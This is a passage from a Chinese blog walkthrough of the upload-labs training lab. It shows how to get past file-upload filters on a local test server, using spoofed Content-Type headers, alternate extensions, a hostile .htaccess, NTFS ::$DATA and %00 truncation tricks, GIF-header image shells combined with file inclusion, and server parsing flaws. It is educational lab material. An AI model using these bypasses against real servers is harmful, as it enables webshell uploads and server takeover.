class=p>][</span><span class=s1>&#39;type&#39;</span><span class=p>]</span> <span class=o>==</span> <span class=s1>&#39;image/gif&#39;</span><span class=p>))</span>
</span></span></code></pre></div><h3 id=使用burp绕过>使用burp绕过</h3><p>Pass-02</p><p>为了方便观察，我们打开upload lab 的 上传存储文件夹 <code>C:\phpstudy_pro\WWW\upload</code></p><p>常见的媒体格式类型如下：
更多参考 runoob <a class=link href=https://www.runoob.com/http/http-content-type.html target=_blank rel=noopener>HTTP content-type | 菜鸟教程 (runoob.com)</a></p><pre><code>  - text/html ： HTML格式
  - text/plain ：纯文本格式
  - text/xml ： XML格式
  - image/gif ：gif图片格式
  - image/jpeg ：jpg图片格式
  - image/png：png图片格式
</code></pre><ol><li>上传1.php文件</li><li>开启抓包，修改文件的 content-type 字段为 image/jpeg</li><li>放行包
<img src=https://i.imgur.com/w1QMd8h.png loading=lazy alt=Imgur></li></ol><hr><h2 id=05-绕过简单黑名单>05-绕过简单黑名单</h2><blockquote><p>适用范围：黑名单，后缀限制较少</p></blockquote><p>如果出现这种提示：不允许上传.asp,.aspx,.php,.jsp后缀文件，则可以判断是黑名单上传。</p><p>对于iis：
可以上传 asa \ cer \ cdx 这些</p><p>对于apache:
可以上传 phtml \ php3 这些</p><p>Pass03</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nv>$is_upload</span> <span class=o>=</span> <span class=k>false</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$msg</span> <span class=o>=</span> <span class=k>null</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;submit&#39;</span><span class=p>]))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nx>file_exists</span><span class=p>(</span><span class=nx>UPLOAD_PATH</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nv>$deny_ext</span> <span class=o>=</span> <span class=k>array</span><span class=p>(</span><span class=s1>&#39;.asp&#39;</span><span class=p>,</span><span class=s1>&#39;.aspx&#39;</span><span class=p>,</span><span class=s1>&#39;.php&#39;</span><span class=p>,</span><span class=s1>&#39;.jsp&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nv>$file_name</span> <span class=o>=</span> <span class=nx>trim</span><span class=p>(</span><span class=nv>$_FILES</span><span class=p>[</span><span class=s1>&#39;upload_file&#39;</span><span class=p>][</span><span class=s1>&#39;name&#39;</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>        <span class=c1>//这里开始下面一大块就是获取后缀名然后tolower
</span></span></span><span class=line><span class=cl>        <span class=nv>$file_name</span> <span class=o>=</span> <span class=nx>deldot</span><span class=p>(</span><span class=nv>$file_name</span><span class=p>);</span><span class=c1>//删除文件名末尾的点
</span></span></span><span class=line><span class=cl>        <span class=nv>$file_ext</span> <span class=o>=</span> <span class=nx>strrchr</span><span class=p>(</span><span class=nv>$file_name</span><span class=p>,</span> <span class=s1>&#39;.&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nv>$file_ext</span> <span class=o>=</span> <span class=nx>strtolower</span><span class=p>(</span><span class=nv>$file_ext</span><span class=p>);</span> <span class=c1>//转换为小写
</span></span></span><span class=line><span class=cl>        <span class=nv>$file_ext</span> <span class=o>=</span> <span class=nx>str_ireplace</span><span class=p>(</span><span class=s1>&#39;::$DATA&#39;</span><span class=p>,</span> <span class=s1>&#39;&#39;</span><span class=p>,</span> <span class=nv>$file_ext</span><span class=p>);</span><span class=c1>//去除字符串::$DATA
</span></span></span><span class=line><span class=cl>        <span class=nv>$file_ext</span> <span class=o>=</span> <span class=nx>trim</span><span class=p>(</span><span class=nv>$file_ext</span><span class=p>);</span> <span class=c1>//收尾去空
</span></span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=o>!</span><span class=nx>in_array</span><span class=p>(</span><span class=nv>$file_ext</span><span class=p>,</span> <span class=nv>$deny_ext</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nv>$temp_file</span> <span class=o>=</span> <span class=nv>$_FILES</span><span class=p>[</span><span class=s1>&#39;upload_file&#39;</span><span class=p>][</span><span class=s1>&#39;tmp_name&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>            <span class=nv>$img_path</span> <span class=o>=</span> <span class=nx>UPLOAD_PATH</span><span class=o>.</span><span class=s1>&#39;/&#39;</span><span class=o>.</span><span class=nx>date</span><span class=p>(</span><span class=s2>&#34;YmdHis&#34;</span><span class=p>)</span><span class=o>.</span><span class=nx>rand</span><span class=p>(</span><span class=mi>1000</span><span class=p>,</span><span class=mi>9999</span><span class=p>)</span><span class=o>.</span><span class=nv>$file_ext</span><span class=p>;</span>            
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=p>(</span><span class=nx>move_uploaded_file</span><span class=p>(</span><span class=nv>$temp_file</span><span class=p>,</span><span class=nv>$img_path</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                 <span class=nv>$is_upload</span> <span class=o>=</span> <span class=k>true</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=nv>$msg</span> <span class=o>=</span> <span class=s1>&#39;上传出错！&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nv>$msg</span> <span class=o>=</span> <span class=s1>&#39;不允许上传.asp,.aspx,.php,.jsp后缀文件！&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nv>$msg</span> <span class=o>=</span> <span class=nx>UPLOAD_PATH</span> <span class=o>.</span> <span class=s1>&#39;文件夹不存在,请手工创建！&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><hr><h2 id=06-htaccess文件重写攻击>06-.htaccess文件重写攻击</h2><blockquote><p>适用范围：黑名单没有限制 .htaccess， Apache专用</p></blockquote><ol><li>上传 1.jpg 文件</li><li>上传 .htaccess 文件</li><li>访问 jpg 上传后的位置，发现已经执行了里面的php代码</li></ol><p>.htaccess 是一个apache的配置文件，可以修改apache服务器处理文件的行为</p><p>比如我们制作一个攻击用 .htaccess 文件内容如下：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-xml data-lang=xml><span class=line><span class=cl><span class=nt>&lt;FilesMatch</span> <span class=err>&#34;jpg&#34;</span><span class=nt>&gt;</span>
</span></span><span class=line><span class=cl>SetHandler application/x-httpd-php
</span></span><span class=line><span class=cl><span class=nt>&lt;/FilesMatch&gt;</span>
</span></span></code></pre></div><p>这样你访问jpg文件目录的时候，他就会把你上传 的 jpg 当作 php 来执行了。</p><hr><h2 id=07-大小写绕过>07-大小写绕过</h2><blockquote><p>适用范围：黑名单，php早期版本，5.x</p></blockquote><p>有的上传使用黑名单，且未对大小写进行严格判断：</p><p>这时候可尝试上传 <code>xxx .phP</code> , 但是貌似对于新的php版本无效。</p><hr><h2 id=08-空格绕过windows服务器点绕过>08-空格绕过、windows服务器点绕过</h2><blockquote><p>适用范围：黑名单，php5.x，后端未对空格过滤 ，服务器采用windows系统</p></blockquote><h3 id=空格绕过>空格绕过</h3><p>Pass-06
Pass-07</p><ol><li>上传1.php</li><li>抓包，改写文件名为 <code>1.php&lt;空格></code></li><li>放行，上传成功</li></ol><blockquote><p>发现一个问题，就是我一开始用了 小皮面板，php版本：7.3.4 ，无法成功。</p><p>但是后面用了按月给的那个环境，php：5.2.17 可复现。</p><p>所以版本比较高的没用。</p></blockquote><h3 id=windows服务器点绕过>windows服务器点绕过</h3><p>如果对方的后端使用的是Windows， Windows系统会在把文件复制到上传文件夹的时候自动删除文件末尾的点 ， 比如你传 <code>1.php.</code> 通过了验证 ,然后Windows把它给挪到上传文件夹后就自动变成 <code>1.php</code></p><ol><li>上传 <code>1.php</code></li><li>抓包，改写文件名为 <code>1.php.</code></li><li>放行，上传成功</li></ol><hr><h2 id=09-ntfs数据流绕过-data>09-NTFS数据流绕过 DATA</h2><blockquote><p>适用范围：windows NTFS ，黑名单，对::$DATA 字符串未做限制</p></blockquote><pre><code>我是win系统，但是硬盘使用了extFAT格式，所以一直不成功。
然后我重启这个phpstudy环境，把整个WWW文件位置挪到了NTFS格式硬盘的桌面上，
还是不行，最后发现要在phpStudy设置中-设置新的网站目录
</code></pre><p><strong>Pass-08</strong></p><p><strong>方法：</strong>
抓包，文件名+"::$DATA" 上传，可用绕过后缀检测</p><h3 id=数据流知识>数据流知识</h3><blockquote><p>下面是经过我修改得的GPT回复，可用用来浅浅的了解下NTFS数据流。</p></blockquote><p>NTFS数据流是指在NTFS文件系统中，一个文件可以包含多个数据流（Alternate Data Streams，ADS）。每个数据流可以存储额外的数据，与文件的主数据流相互独立，但在一般情况下是不可见的。</p><p>对于普通用户而言，操作NTFS数据流可能需要一些高级的技术和工具。然而，以下是一种简单的方法来操作NTFS数据流：</p><ol><li>创建一个新的文本文件，例如"test.txt"。</li><li>打开命令提示符（CMD）。</li><li>使用以下命令创建一个新的数据流并写入数据：<br>      <code>echo This is a hidden message > test.txt:hidden.txt</code><br>   这个命令将在"test.txt"文件中创建一个名为"hidden.txt"的数据流，并将"This is a hidden message"写入该数据流。</li><li>使用以下命令查看文件中的所有数据流：<br>      <code>dir /r test.txt</code><br>   这个命令将显示"test.txt"文件以及它的所有数据流。</li><li>使用以下命令读取数据流的内容：<br>      <code>more &lt; test.txt:hidden.txt</code><br>   这个命令将显示"hidden.txt"数据流中的内容。</li></ol><p>请注意，以上方法仅适用于在Windows命令提示符下进行简单的操作。</p><hr><p>我理解，数据流就是NTFS系统中的一种隐藏文件，这玩意可有一个宿主文件。宿主文件删了，数据流就跟着没了。</p><hr><h2 id=10-windows-叠加特征上传>10-windows 叠加特征上传</h2><p>Pass-09</p><blockquote><p>适用范围：windows NTFS ，黑名单，对 尖括号没有限制的情况</p></blockquote><ol><li>上传 <code>s.jpg</code> 文件，文件名用 burp 修改：</li></ol><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>s.php:s.jpg
</span></span></code></pre></div><blockquote><p>这时候系统就会通过校验，因为后缀名是jpg，但是因为文件流，实际上 s.jpg 将会不可见。并且会新建一个 s.php 文件（空文件）</p></blockquote><ol start=2><li><p>上传 1.php 文件，抓包修改名称 为 <code>s.>>></code> 代表 <code>s.???</code> ，会正则匹配到刚才创建的 s.php 。 然后系统会把他的内容变成你新上传的内容。</p></li><li><p>打开 ： http://localhost/upload/s.php 即可发现上传成功</p></li></ol><p>文件名匹配规则：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>  双引号&#34; 等于 点号.
</span></span><span class=line><span class=cl>  大于符号&gt; 等于 问号?
</span></span><span class=line><span class=cl>  小于符号&lt; 等于 星号*
</span></span></code></pre></div><hr><h2 id=11-双写文件名>11-双写文件名</h2><p>Pass-10</p><blockquote><p>适用范围：黑名单，上传后端使用关键字删除
如上传 <code>1.php</code> ， 实际会上传文件 <code>1.</code> 到目录的情况</p></blockquote><ol><li>抓包修改文件名称为 <code>1.pphphp</code> （在php外面夹着一个p hp，其他类型文件同理，只要过滤器做的比较垃圾就会成功绕过）</li><li>查看发现上传成功</li></ol><hr><h2 id=12-上传参数目录可控>12-上传参数目录可控</h2><blockquote><p>适用范围：php&lt;5.3.4 ， 未开启gpc , 使用%00</p></blockquote><h3 id=get-方式>Get 方式</h3><p>Pass-11</p><blockquote><p>客户端可以控制上传路径，如 url中有如下类似字串 <code>?save_path=../upload/</code></p></blockquote><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nv>$img_path</span> <span class=o>=</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;save_path&#39;</span><span class=p>]</span><span class=o>.</span><span class=s2>&#34;/&#34;</span><span class=o>.</span><span class=nx>rand</span><span class=p>(</span><span class=mi>10</span><span class=p>,</span> <span class=mi>99</span><span class=p>)</span><span class=o>.</span><span class=nx>date</span><span class=p>(</span><span class=s2>&#34;YmdHis&#34;</span><span class=p>)</span><span class=o>.</span><span class=s2>&#34;.&#34;</span><span class=o>.</span><span class=nv>$file_ext</span><span class=p>;</span>
</span></span></code></pre></div><blockquote><p>正常上传会产生 一个上传目录：<code>../upload/039840198431.jpg</code></p></blockquote><ol><li>上传jpg文件</li><li>抓包修改请求头为 <code>?save_path=../upload/1.php%00</code></li><li>这样上传路径变成 <code>../upload/1.php%00039840198431.jpg</code> ， 然后php 保存的时候把 %00 后面的东西都忽略了，就把文件保存成 1.php 了</li><li>访问 http://localhost/upload/1.php 成功</li></ol><h3 id=post-方式>Post 方式</h3><p>Pass-12</p><p>php后端源码改用了 post 方式获取 savepath，这时候同样可以使用 %00 但是要进行url解码。</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl> <span class=nv>$img_path</span> <span class=o>=</span> <span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;save_path&#39;</span><span class=p>]</span><span class=o>.</span><span class=s2>&#34;/&#34;</span><span class=o>.</span><span class=nx>rand</span><span class=p>(</span><span class=mi>10</span><span class=p>,</span> <span class=mi>99</span><span class=p>)</span><span class=o>.</span><span class=nx>date</span><span class=p>(</span><span class=s2>&#34;YmdHis&#34;</span><span class=p>)</span><span class=o>.</span><span class=s2>&#34;.&#34;</span><span class=o>.</span><span class=nv>$file_ext</span><span class=p>;</span>
</span></span></code></pre></div><ol><li>上传jpg文件</li><li>抓包修改post 内容</li></ol><div class=highlight><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=n>Content</span><span class=o>-</span><span class=n>Disposition</span><span class=p>:</span> <span class=n>form</span><span class=o>-</span><span class=n>data</span><span class=p>;</span> <span class=n>name</span><span class=o>=</span><span class=s2>&#34;save_path&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>../</span><span class=n>upload</span><span class=o>/</span><span class=mf>2.</span><span class=n>php</span><span class=o>%</span><span class=mi>00</span>
</span></span></code></pre></div><ol start=4><li>选择 <code>%00</code> 按下 <code>ctrl + shift + u</code> 进行俩 decode ， 然后放行 (%00 会变成一个空的方框一样的东西)</li><li>访问 http://localhost/upload/1.php 成功</li></ol><hr><h2 id=13-文件头检测绕过>13-文件头检测绕过</h2><p>之前的章节一直是用后缀名限制，并且是黑名单，属于较容易绕过的上传漏洞。
从这里开始的Pass基本上都是白名单了。</p><p>Pass-13</p><blockquote><p>适用范围：采用文件魔数字（文件头的两个字节）判断文件类型的检测
上传的图片木马需要借助 <a class=link href=http://localhost/include.php target=_blank rel=noopener>文件包含漏洞</a> 才能正常运行</p></blockquote><p>常见的文件头参考表（HEX格式） <a class=link href=https://blog.51cto.com/u_2982693/3354695 target=_blank rel=noopener>51CTO博客_</a></p><ul><li>JPEG (jpg)，文件头：FFD8FF</li><li>PNG (png)，文件头：89504E47
这些都是16进制文件头，可以使用 <a class=link href="https://gchq.github.io/CyberChef/#recipe=From_Hex%28%27Auto%27%29" target=_blank rel=noopener>From Hex - CyberChef</a> 尝试在线解码 ，比如 jpg 解码后是 <code>ÿØÿ</code> 但一般这种乱码都不好用，比较推荐利用gif文件，gif的头<code>47 49 46 38</code>解码后是 <code>GIF8</code> ，可以轻松使用burp上传。</li></ul><p>获取文件头还有一种简单的方式，就是找到一个文件，用记事本打开，然后复制第一个单词之类的</p><p>制作图片马 有两种方式，一种是基于真正的图片，一种是抓包修改头部，让服务器以为自己收到的是图片。</p><h3 id=基于真正的图片法>基于真正的图片法</h3><p>打开cmd ，准备好 1.gif 和 1.php ，执行下方代码：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=n>copy</span> <span class=mf>1.</span><span class=n>gif</span><span class=o>/</span><span class=n>b</span><span class=o>+</span><span class=mf>1.</span><span class=n>php</span> <span class=n>ma</span><span class=p>.</span><span class=n>gif</span>
</span></span></code></pre></div><p>制作好<code>ma.gif</code>之后，用记事本打开，可以发现，相当于在 原版的 <code>1.gif</code> 尾部，追加了 <code>&lt;?php phpinfo();?></code> 。</p><ol><li>上传<code>ma.gif</code></li><li>获取上传后路径 http://localhost/upload/1020230731134955.gif ， 路径为 <code>upload/1020230731134955.gif</code></li><li>与文件包含漏洞 http://localhost/include.php 组合</li><li>访问 http://localhost/include.php?file=upload/1020230731134955.gif 图片马执行。</li></ol><h3 id=抓包修改头部法>抓包修改头部法</h3><ol><li>上传 1.php</li><li>抓包修改
原包</li></ol><div class=highlight><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=o>-----------------------------</span><span class=mi>30629768524726476051439622056</span>
</span></span><span class=line><span class=cl><span class=n>Content</span><span class=o>-</span><span class=n>Disposition</span><span class=p>:</span> <span class=n>form</span><span class=o>-</span><span class=n>data</span><span class=p>;</span> <span class=n>name</span><span class=o>=</span><span class=s2>&#34;upload_file&#34;</span><span class=p>;</span> <span class=n>filename</span><span class=o>=</span><span class=s2>&#34;1.php&#34;</span>
</span></span><span class=line><span class=cl><span class=n>Content</span><span class=o>-</span><span class=n>Type</span><span class=p>:</span> <span class=n>application</span><span class=o>/</span><span class=n>octet</span><span class=o>-</span><span class=n>stream</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>&lt;</span><span class=err>?</span><span class=n>php</span> <span class=n>phpinfo</span><span class=p>();</span><span class=err>?</span><span class=o>&gt;</span>
</span></span></code></pre></div><p>修改后(修改了文件后缀名和包内容前面部分)</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=o>-----------------------------</span><span class=mi>30629768524726476051439622056</span>
</span></span><span class=line><span class=cl><span class=n>Content</span><span class=o>-</span><span class=n>Disposition</span><span class=p>:</span> <span class=n>form</span><span class=o>-</span><span class=n>data</span><span class=p>;</span> <span class=n>name</span><span class=o>=</span><span class=s2>&#34;upload_file&#34;</span><span class=p>;</span> <span class=n>filename</span><span class=o>=</span><span class=s2>&#34;1.gif&#34;</span>
</span></span><span class=line><span class=cl><span class=n>Content</span><span class=o>-</span><span class=n>Type</span><span class=p>:</span> <span class=n>application</span><span class=o>/</span><span class=n>octet</span><span class=o>-</span><span class=n>stream</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>GIF8</span><span class=o>&lt;</span><span class=err>?</span><span class=n>php</span> <span class=n>phpinfo</span><span class=p>();</span><span class=err>?</span><span class=o>&gt;</span>
</span></span></code></pre></div><ol start=3><li>截获返回包，搜索<code>../upload</code> 搜索到上传位置 ：/upload/8320230731140148.gif</li><li>与文件包含漏洞 http://localhost/include.php 组合</li><li>访问 http://localhost/include.php?file=upload/8320230731140148.gif 图片马执行。</li></ol><h2 id=14-绕过图片二次渲染>14-绕过图片二次渲染</h2><p>Pass-16</p><blockquote><p>适用范围：图片上传后会进行压缩，压缩后可能会损坏php后门的情况
上传的图片木马需要借助 <a class=link href=http://localhost/include.php target=_blank rel=noopener>文件包含漏洞</a> 才能正常运行</p></blockquote><p>解法：先正常上传文件（推荐gif，因为gif压缩比小），然获取压缩后文件，进行对比找到未压缩的部分，用php后门覆盖一小块未压缩部分的文件</p><p>使用工具：HxD Hex Editor<br>如果你不想要用这个win工具，可以试试网页版Hex编辑器，但是可能会很卡顿 <a class=link href=https://hexed.it/ target=_blank rel=noopener>https://hexed.it/</a></p><ol><li>上传1.gif，获取上传后文件20161.gif</li><li>通过使用 HxD工具进行查看和对比，发现文件前部基本无区别，覆盖修改一部分内容为</li></ol><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&lt;?php phpinfo();?&gt;
</span></span></code></pre></div><ol start=3><li>另存为 3.gif</li><li>上传3.gif ，获取到上传后路径： upload/17173.gif</li><li>与文件包含漏洞 http://localhost/include.php 组合</li><li>访问 http://localhost/include.php?file=upload/17173.gif 图片马执行。</li></ol><h2 id=15-文件名可控绕过>15-文件名可控绕过</h2><p>适用范围：php&lt;5.3.4 ， 未开启gpc , 使用%00</p><p>对于iis&lt;6.0 ： 使用分号 1.asp;1.jpg</p><p>对于apache ，使用 .a 1.php.a (优先左解释)</p><p>斜杠法 ： 1.php/.</p><h2 id=17-文件上传其他漏洞>17-文件上传其他漏洞</h2><p>nginx 0.83</p><p>上传jpg文件，访问 <code>1.jpg%00php</code> ，会被当作php解析</p><p>apahce 1.x 或者 2.x</p><p>当 apache 遇见不认识的后缀名，会从后向前解析例
如 1.php.rar 不认识 rar 就向前解析，直到知道它认识的后缀名。</p><p>phpcgi 漏洞(nginx iis7 或者以上)</p><p>上传图片1.jpg。访问 1.jpg/1.php 也会解析成 php。</p><p>Apache HTTPD 换行解析漏洞（CVE-2017-15715）</p><p>apache通过 mod_php来运行脚本，其 2.4.0-2.4.29中存在apache 换行解析漏洞，上传文件名为 <code>xxx.php\x0A</code>（x0A) 是换行符
将被按照 PHP 后缀进行解析，导致绕过一些服务器的安全策略</p></section><footer class=article-footer><section class=article-tags><a href=/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/>渗透测试</a>
<a href=/tags/upload-labs/>Upload-Labs</a></section><section class=article-copyright><svg class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
<span>Licensed under CC BY-NC-SA 4.0</span></section></footer></article><aside class=related-content--wrapper><h2 class=section-title>相关文章</h2><div class=related-content><div class="flex article-list--tile"><article><a href=/p/frp%E9%85%8D%E7%BD%AE%E6%8C%87%E5%8D%97/><div class=article-details><h2 class=article-title>Frp配置指南</h2></div></a></article><article class=has-image><a href=/p/burp%E4%B8%8B%E8%BD%BD%E7%A0%B4%E8%A7%A3%E7%89%88/><div class=article-image><img src=/burp.png loading=lazy data-key data-hash=/burp.png></div><div class=article-details><h2 class=article-title>Burp下载（破解版）</h2></div></a></article><article class=has-image><a href=/p/vscode%E9%85%8D%E5%90%88wsl%E7%BC%96%E7%A8%8B/><div class=article-image><img src=/vscode.jpg loading=lazy data-key data-hash=/vscode.jpg></div><div class=article-details><h2 class=article-title>vscode配合wsl编程</h2></div></a></article><article class=has-image><a href=/p/tmux/><div class=article-image><img src=/tmux.jpg loading=lazy data-key data-hash=/tmux.jpg></div><div class=article-details><h2 class=article-title>Tmux</h2></div></a></article><article class=has-image><a href=/p/wireguard-%E7%AE%A1%E7%BA%BF%E5%8D%AB%E5%A3%AB/><div class=article-image><img src=/wireguard.png loading=lazy data-key data-hash=/wireguard.png></div><div class=article-details><h2 class=article-title>Wireguard-管线卫士</h2></div></a></article></div></div></aside><script src=https://utteranc.es/client.js repo=cornradio/blog-comments issue-term=pathname crossorigin=anonymous async></script><style>.utterances{max-width:unset}</style><script>let utterancesLoaded=!1;function setUtterancesTheme(e){let t=document.querySelector(".utterances iframe");t&&t.contentWindow.postMessage({type:"set-theme",theme:`github-${e}`},"https://utteranc.es")}addEventListener("message",e=>{if(e.origin!=="https://utteranc.es")return;utterancesLoaded=!0,setUtterancesTheme(document.documentElement.dataset.scheme)}),window.addEventListener("onColorSchemeChange",e=>{if(!utterancesLoaded)return;setUtterancesTheme(e.detail)})</script><footer class=site-footer><section class=copyright>&copy;
1998 -
2026</section><section class=powerby>爱分享<br>使用 <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a> 构建<br>主题 <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.33.0>Stack</a></b> 由 <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a> 设计</section></footer><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
<button class="pswp__button pswp__button--share" title=Share></button>
<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
</button>
<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css crossorigin=anonymous></main></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z+KMkF24hUW8WePSA9HM=" crossorigin=anonymous></script><script type=text/javascript src=/ts/main.c922af694cc257bf1ecc41c0dd7b0430f9114ec280ccf67cd2c6ad55f5316c4e.js defer></script><script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script></body></html>